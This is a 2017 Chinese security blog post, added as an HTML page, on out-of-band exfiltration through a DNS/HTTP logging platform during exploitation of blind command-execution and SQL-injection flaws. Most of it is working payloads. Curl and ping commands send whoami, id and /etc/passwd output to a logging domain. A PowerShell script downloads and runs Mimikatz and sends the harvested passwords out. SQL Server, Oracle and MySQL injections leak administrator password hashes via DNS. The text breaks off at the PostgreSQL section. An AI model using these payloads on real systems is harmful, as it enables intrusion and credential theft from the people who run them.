@@ -1,0 +1,808 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="之前搞某站点是有Struts漏洞，但是不确定内网是否有网络，基友就通过类似于CloudEye这样的平台来检测，之后他自己塔的平台还有API都给了我，因为之前一直没有研究过，也拖了挺长时间的所以抽取出一点时间来搞事情,这里很多技巧都是参考他给的链接。
+我经常会在日志中会提起这基友，这基友人真的很好，乐于帮助人，现在我技术渣无以回报。
+禁止转载！！！！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tankeye使用宝典">
+<meta property="og:url" content="http://yoursite.com/2017/05/21/Tankeye使用宝典/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="之前搞某站点是有Struts漏洞，但是不确定内网是否有网络，基友就通过类似于CloudEye这样的平台来检测，之后他自己塔的平台还有API都给了我，因为之前一直没有研究过，也拖了挺长时间的所以抽取出一点时间来搞事情,这里很多技巧都是参考他给的链接。
+我经常会在日志中会提起这基友，这基友人真的很好，乐于帮助人，现在我技术渣无以回报。
+禁止转载！！！！">
+<meta property="og:image" content="http://i.imgur.com/JyY4Gz3.jpg">
+<meta property="og:image" content="http://i.imgur.com/XTzaA53.jpg">
+<meta property="og:image" content="http://i.imgur.com/mm3oU6K.jpg">
+<meta property="og:image" content="http://i.imgur.com/jBaLPcI.jpg">
+<meta property="og:image" content="http://i.imgur.com/da8ZbUY.jpg">
+<meta property="og:image" content="http://i.imgur.com/DdsMmdT.jpg">
+<meta property="og:image" content="http://i.imgur.com/52NwM9O.jpg">
+<meta property="og:image" content="http://i.imgur.com/sp6Jf2u.jpg">
+<meta property="og:updated_time" content="2017-05-31T12:02:43.060Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Tankeye使用宝典">
+<meta name="twitter:description" content="之前搞某站点是有Struts漏洞，但是不确定内网是否有网络，基友就通过类似于CloudEye这样的平台来检测，之后他自己塔的平台还有API都给了我，因为之前一直没有研究过，也拖了挺长时间的所以抽取出一点时间来搞事情,这里很多技巧都是参考他给的链接。
+我经常会在日志中会提起这基友，这基友人真的很好，乐于帮助人，现在我技术渣无以回报。
+禁止转载！！！！">
+<meta name="twitter:image" content="http://i.imgur.com/JyY4Gz3.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Tankeye使用宝典 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Tankeye使用宝典
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-05-21T15:05:56+08:00" content="2017-05-21">
+              2017-05-21
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/05/21/Tankeye使用宝典/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/05/21/Tankeye使用宝典/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://i.imgur.com/JyY4Gz3.jpg" alt=""></p>
+<p>之前搞某站点是有Struts漏洞，但是不确定内网是否有网络，基友就通过类似于<code>CloudEye</code>这样的平台来检测，之后他自己塔的平台还有API都给了我，因为之前一直没有研究过，也拖了挺长时间的所以抽取出一点时间来搞事情,这里很多技巧都是参考他给的链接。</p>
+<p>我经常会在日志中会提起这基友，这基友人真的很好，乐于帮助人，现在我技术渣无以回报。</p>
+<p>禁止转载！！！！</p>
+<a id="more"></a>
+<p>禁止转载！！！！</p>
+<p>禁止转载！！！！</p>
+<h3 id="可以用来做什么？"><a href="#可以用来做什么？" class="headerlink" title="可以用来做什么？"></a>可以用来做什么？</h3><p>一般我们利用漏洞估计是这样<br><img src="http://i.imgur.com/XTzaA53.jpg" alt=""></p>
+<p>那么如何这些SQL类似于盲注以及其它<code>SSRF</code>无回显呢？<br>一般XSS或盲注以及二次注入没有办法回显，或许我们碰到了只是并不知道如何去利用，这样会错过很多漏洞。</p>
+<p>其实BurpSuite早出了类似的功能。<br><img src="http://i.imgur.com/mm3oU6K.jpg" alt=""></p>
+<p>能够帮助您在没有回显的情况下快速获取命令执行漏洞/SQL注入漏洞的结果，因此在实际的使用过程中它可<br>以为您节约大量的时间开支/请求开支。</p>
+<p>其原理是用dns泛解析技术,记录所有域名查询请求,(如:123.veye.info)发起解析请求时Tankeye的解析服务都会进行日志记录,根据每个用户的特有子域名(如:qw3er454.veye.info)进行分类管理。</p>
+<p>可以毫不夸张地说，任何可以发起请求(DNS/HTTP请求未被过滤)的漏洞都可以用Tankeye来 验证 漏洞是否存在。典型的漏洞有以下几类:</p>
+<blockquote>
+<ul>
+<li>命令执行</li>
+<li>SSRF(务器端请求伪造)</li>
+<li>XXE(XML外部实体注入攻击)</li>
+<li>SQL注入</li>
+<li>XSS(跨站脚本攻击)</li>
+<li>……</li>
+</ul>
+</blockquote>
+<p>可以用别人已塔建好的平台或者自己塔建：<br><a href="https://github.com/KibodWapon/NoEye" target="_blank" rel="external">https://github.com/KibodWapon/NoEye</a></p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux下可以发起请求的命令很多，如:wget、curl、ping、nslookup、dig等。若去细分的话wget和curl则是发起http请求(当然也会连带出DNS解析请求)产生Apache日志和DNS日志，其它的几个命令则只会在Tankeye中产生DNS日志。<br>若仅验证漏洞是否存在，则简单的请求载荷便可达到效果。如:</p>
+<blockquote>
+<ul>
+<li>wget <a href="http://cmd.qw3er454.veye.info/" target="_blank" rel="external">http://cmd.qw3er454.veye.info/</a></li>
+<li>curl cmd.qw3er454.veye.info</li>
+<li>ping cmd.qw3er454.veye.info -t 1</li>
+<li>nslookup cmd.qw3er454.veye.info</li>
+<li>dig cmd.qw3er454.veye.info</li>
+</ul>
+</blockquote>
+<p>以上几条命令仅限于验证命令执行漏洞是否存在。<br>如果是想获取反回结果，有二种方案：一是发起解析请求时在DNS日志里返回结果；二是发起HTTP请求时在Apache日志里返回结果。</p>
+<p>例子：<br>Linux会将反引号当作命令执行，所以会进行拼接到域名中再Ping,因此在DNS可以看到所执行结果反回在二级域名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.c5xxx.xxx.io -c 1</span><br></pre></td></tr></table></figure>
+<p>返回结果：<br><img src="http://i.imgur.com/jBaLPcI.jpg" alt=""></p>
+<p>除了反引号外还有<code>$()</code>一样可以执行命令。<br>域名的长度是有限制的,且不能带有某此”特殊”字符。</p>
+<p>如果是一些特殊字符可以用HTTP请求，通过Apache日志来查看。</p>
+<p>例子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl exec.c5xxx.xxx.io/?whoami=`whoami`</span><br></pre></td></tr></table></figure>
+<p>反回结果<br><img src="http://i.imgur.com/da8ZbUY.jpg" alt=""></p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.c5xxx.xxx.io</span><br></pre></td></tr></table></figure>
+<p>返回结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator.c5xxx.xxx.io</span><br></pre></td></tr></table></figure></p>
+<p>相比与Linux，Windows的命令执行显然要更难以返回结果。Windows下工具实在少之又少，但也并非完全没有好的玩法。下面列举几例:<br>Windows下可以发起请求的命令也有数种，如:ping、nslookup、iexplore、powershell、vbs等各类脚本。单就命令的简繁程度来看，前两个显然更适合回传数据。Windows自带start命令，可以用来调用默认的浏览器打开指定网址。我们也可以用此命令来使用Apache日志回传量大的数据。但一定不要忘了执行start命令后再taskkill /f /im iexplore.exe来结束IE进程。若目标系统使用的是其它浏览器作为默认浏览器，则结束其它浏览器的进程。<br>命令:</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> ('whoami') <span class="keyword">do</span> <span class="built_in">start</span> http://<span class="built_in">cmd</span>.c5xxx.xxx.io?result=%x</span><br><span class="line"><span class="built_in">taskkill</span> /f /im iexplore.exe</span><br></pre></td></tr></table></figure>
+<p>反回结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://cmd.c5xxx.xxx.io/?result=t-pc\administrator</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0</span><br></pre></td></tr></table></figure>
+<p>需要要注意的是For命令会将括号中命令的执行结果每一行都作为一个单独的请求执行，且Windows的命令结果会因某些字符而截断，如:</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> ('<span class="built_in">net</span> user') <span class="keyword">do</span> <span class="built_in">start</span> http://<span class="built_in">cmd</span>.c5xxx.xxx.io/?result=%x</span><br></pre></td></tr></table></figure>
+<p>返回指定目录的目录和文件名:</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> ('<span class="built_in">dir</span> /b C:\Windows\debug\') <span class="keyword">do</span> <span class="built_in">ping</span> %x.directory.c5xxx.xxx.io -n <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>返回结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIA.directory.c5xxx.xxx.io</span><br><span class="line">PASSWD.LOG.directory.c5xxx.xxx.io</span><br></pre></td></tr></table></figure></p>
+<h3 id="高级技巧收集"><a href="#高级技巧收集" class="headerlink" title="高级技巧收集"></a>高级技巧收集</h3><h4 id="1、编码后返回结果"><a href="#1、编码后返回结果" class="headerlink" title="1、编码后返回结果"></a>1、编码后返回结果</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl exec.c5xxx.xxx.io/?id=`id|base64`</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://exec.c5xxx.xxx.io/?id=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkg57uEPTAocm9vdCkK</span><br></pre></td></tr></table></figure>
+<h4 id="2、UserAgent中携带数据"><a href="#2、UserAgent中携带数据" class="headerlink" title="2、UserAgent中携带数据"></a>2、UserAgent中携带数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl exec.c5xxx.xxx.io --user-agent `id|base64`</span><br></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/DdsMmdT.jpg" alt=""></p>
+<h4 id="3、读取指定行返回"><a href="#3、读取指定行返回" class="headerlink" title="3、读取指定行返回"></a>3、读取指定行返回</h4><p>第一行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl exec.c5xxx.xxx.io --user-agent `cat /etc/passwd | tail -n +1 | head -n 1`</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i.imgur.com/52NwM9O.jpg" alt=""></p>
+<p>第二行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl exec.c5xxx.xxx.io --user-agent `cat /etc/passwd | tail -n +2 | head -n 1`</span><br></pre></td></tr></table></figure></p>
+<h4 id="4、分段返回命令结果"><a href="#4、分段返回命令结果" class="headerlink" title="4、分段返回命令结果"></a>4、分段返回命令结果</h4><p>返回id命令base64结果的1-10个字符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `id|base64|cut -c 1-10`.qw3er454.veye.info</span><br></pre></td></tr></table></figure>
+<h4 id="5、接收POST数据"><a href="#5、接收POST数据" class="headerlink" title="5、接收POST数据"></a>5、接收POST数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="_">-d</span> <span class="string">"`id`"</span> <span class="string">"http://veye.info/6bd3bebd"</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-PowerShell实现Windows密码回传"><a href="#6-PowerShell实现Windows密码回传" class="headerlink" title="6.PowerShell实现Windows密码回传"></a>6.PowerShell实现Windows密码回传</h4><blockquote>
+<ul>
+<li>1.获取密码并把值给$Mimikatzinfo</li>
+<li>2.利用powershell正则表达式提取关键内容</li>
+<li>3.转码访问</li>
+<li>4.解码</li>
+</ul>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'</span>);</span><br><span class="line"><span class="variable">$Mimikatzinfo</span> = invoke-mimikatz;</span><br><span class="line"><span class="variable">$Mimikatzinfo</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Mimikatzinfo</span> = invoke-mimikatz;</span><br><span class="line"><span class="variable">$regex</span> = [regex]<span class="string">".*Username : (.*?)\n.*\n.*Password : (.*?)\n"</span>;</span><br><span class="line"><span class="variable">$word</span> = (<span class="variable">$regex</span>.Matches(<span class="variable">$Mimikatzinfo</span>)| %&#123;<span class="variable">$_</span>.value&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$word</span>[<span class="number">2</span>].split(<span class="string">"*"</span>)[<span class="number">1</span>].split(<span class="string">":"</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$word</span>[<span class="number">2</span>].split(<span class="string">"*"</span>)[<span class="number">3</span>].split(<span class="string">":"</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$full</span>=<span class="variable">$username</span>.trim()+<span class="string">"_"</span>+<span class="variable">$password</span>.trim();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ab</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class="variable">$full</span>);</span><br><span class="line"><span class="variable">$luffy</span>=[System.BitConverter]::ToString(<span class="variable">$ab</span>);<span class="variable">$onepiece</span>=<span class="variable">$luffy</span>.replace(<span class="string">"-"</span>,<span class="string">""</span>);</span><br><span class="line"><span class="variable">$wc</span>=<span class="built_in">new-object</span> System.Net.webclient;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$wc</span>.downloadstring(<span class="string">"http://"</span>+<span class="variable">$onepiece</span>+<span class="string">".c5xxx.xxx.io"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">""</span></span><br><span class="line"><span class="variable">$t</span>=<span class="string">"十六进制"</span></span><br><span class="line"><span class="variable">$t</span> -split <span class="string">'(.&#123;2&#125;)'</span> |%&#123; <span class="keyword">if</span> (<span class="variable">$_</span> <span class="nomarkup">-ne</span> <span class="string">""</span>) &#123; <span class="variable">$pass</span>+=[CHAR]([CONVERT]::toint16(<span class="string">"<span class="variable">$_</span>"</span>,<span class="number">16</span>))  &#125;&#125;</span><br><span class="line">write <span class="variable">$pass</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/sp6Jf2u.jpg" alt=""></p>
+<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><blockquote>
+<ul>
+<li>master..xp_dirtree</li>
+</ul>
+</blockquote>
+<p>扩展存储程序<code>master..xp_dirtree（）</code>用于获取所有文件夹的列表和给定文件夹内部的子文件夹：<br>例如，要获得<code>C:\Windows run</code>:里的所有文件夹和子文件夹：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_dirtree &apos;C:\Windows&apos;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>master..xp_fileexist<br>扩展存储程序<code>master..xp_fileexist()</code>用于确定一个特定的文件是否存在于硬盘：<code>xp_fileexist &#39;&#39;</code> 例如，要检查<code>boot.ini</code>文件是否存在于磁盘C 运行:</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_fileexist &apos;C:\boot.ini&apos;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>master..xp_subdirs<br>扩展存储程序<code>master..xp_subdirs（）</code>用于得到给定的文件夹内的文件夹列表：例如，要获得<code>C:\Windows</code>中的所有次级文件夹:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_subdirs &apos;C:\Windows&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<p>通过MsSQL的扩展存储程序<code>master..xp_dirtree()</code>将管理员（sa）的密码哈希通过DNS传输的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=&apos;sa&apos;)</span><br><span class="line">+&apos;.ip.port.b182oj.ceye.io&apos;;</span><br><span class="line"> EXEC(&apos;master..xp_dirtree</span><br><span class="line">&quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</span><br></pre></td></tr></table></figure></p>
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracle提供的PL/ SQL包被捆绑在它的Oracle数据库服务器来扩展数据库功能。为了实现本文的目的，其中几个用于网络接入的包让人特别感兴趣。</p>
+<blockquote>
+<ul>
+<li>UTL_INADDR.GET_HOST_ADDRESS<br><code>UTL_INADDR</code>包用于互联网的寻址–诸如检索本地和远程主机的主机名和IP的地址。<br>它的成员函数<code>GET_HOST_ADDRESS()</code>用于检索特定主机的IP：<br>例如，为了获得<code>test.example.com</code>的IP地址，运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;test.example.com&apos;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>UTL_HTTP.REQUEST<br>UTL_HTTP包用于从SQL和PL/SQL中标注出HTTP。 它的程序<code>REQUEST()</code>回从给定的地址检索到的第1-2000字节的数据：<code>UTL_HTTP.REQUEST(&#39;&#39;)</code><br>例如，为了获得<code>http://test.example.com/index.php</code>页面的前两千字节的数据，运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_HTTP.REQUEST(&apos;http://test.example.com/index.php&apos;) FROM DUAL;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>HTTPURITYPE.GETCLOB<br><code>HTTPURITYPE</code>类的实例方法GETCLOB()返回从给定地址中检索到的<code>CLOB（Character Large Object）HTTPURITYPE(&#39;&#39;).GETCLOB()</code><br>例如，从页面<a href="http://test.example.com/index.php开始内容检索" target="_blank" rel="external">http://test.example.com/index.php开始内容检索</a> 运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT HTTPURITYPE(&apos;http://test.example.com/index.php&apos;).GETCLOB() FROM DUAL;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>DBMS_LDAP.INIT<br>DBMS_LDAP包使得PL/SQL程序员能够访问轻量级目录访问协议（LDAP）服务器。它的程序INIT()用于初始化与LDAP服务器的会话：<code>DBMS_LDAP.INIT((&#39;&#39;,)</code><br>例如：初始化与主机test.example.com的连接 运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_LDAP.INIT((&apos;test.example.com&apos;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+<p>攻击者可以使用任何以上提到的Oracle子程序发起DNS请求。然而，在Oracle 11g中，除了<code>DBMS_LDAP.INIT()</code>以外的所有可能导致网络访问子程序都受到限制。以下例子是系统管理员（SYS）的密码哈希被Oracle程序<code>DBMS_LDAP.INIT（）</code>通过DNS解析机制传输：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.example.com&apos;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><blockquote>
+<ul>
+<li>LOAD_FILE<br>MySQL的函数<code>LOAD_FILE()</code>读取文件内容并将其作为字符串返回：<code>LOAD_FILE(&#39;&#39;)</code><br>例如，要获取<code>C:\Windows\system.ini</code>文件的内容 运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&apos;C:\\Windows\\system.ini&apos;) ;</span><br></pre></td></tr></table></figure>
+<p>以下是使用MySQL的函数<code>LOAD_FILE()</code>将系统管理员的密码通过DNS解析机制传输的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.mysql.ip.port.b182oj.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure>
+<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><blockquote>
+<ul>
+<li>COPY<br>PostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据：<br>例如，为了将<code>C:\Windows\Temp\users.txt</code>的文件内容拷贝到含有唯一列names的users表中 运行：</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY users(names) FROM &apos;C:\\Windows\\Temp\\users.txt&apos;</span><br></pre></td></tr></table></figure>
+<p>以下是使用PostgreSQL的声明COPY将系统管理员的密码通过DNS解析机制传输的例子：</p>
